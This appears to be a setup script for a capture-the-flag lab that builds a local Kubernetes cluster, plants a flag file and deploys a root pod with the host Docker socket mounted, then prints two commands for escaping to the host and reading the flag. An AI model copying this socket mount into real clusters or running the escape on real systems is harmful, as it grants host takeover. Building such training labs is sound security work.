#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-17-docker-sock"

FLAG="${CVE_FLAG:-flag{k8s-17-default}}"
FLAG_DIR="/home/kianabin/cve-flags/k8s-17"
mkdir -p "$FLAG_DIR"
echo "$FLAG" > "$FLAG_DIR/flag.txt"

echo "[K8S-17] Docker Socket Mount Escape"
echo "[*] Creating KIND cluster with Docker socket access..."
kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true
sleep 10

echo "[*] Pulling Docker CLI image..."
docker pull docker:cli 2>/dev/null || true
kind load docker-image docker:cli --name "$CLUSTER_NAME" 2>/dev/null || true

echo "[*] Deploying pod with Docker socket access..."
kubectl apply -f - << 'YAML'
apiVersion: v1
kind: Pod
metadata:
  name: docker-escape-pod
spec:
  containers:
    - name: attacker
      image: docker:cli
      imagePullPolicy: IfNotPresent
      command: ["sleep", "3600"]
      securityContext:
        runAsUser: 0
      volumeMounts:
        - name: docker-sock
          mountPath: /var/run/docker.sock
        - name: host-flag
          mountPath: /host-flag
  volumes:
    - name: docker-sock
      hostPath:
        path: /var/run/docker.sock
        type: Socket
    - name: host-flag
      hostPath:
        path: /host-flag
        type: Directory
YAML

echo "[*] Waiting for pod to be ready..."
kubectl wait --for=condition=Ready pod/docker-escape-pod --timeout=60s 2>/dev/null || true
sleep 5

echo ""
echo "[+] K8S-17 Docker Socket Escape Ready"
echo "    Flag directory: $FLAG_DIR"
echo "    Flag: $FLAG"
echo ""
echo "    Exploitation steps:"
echo "    1. kubectl exec -it docker-escape-pod -- sh"
echo "    2. docker run --rm -v /home/kianabin/cve-flags/k8s-17:/mnt alpine cat /mnt/flag.txt"
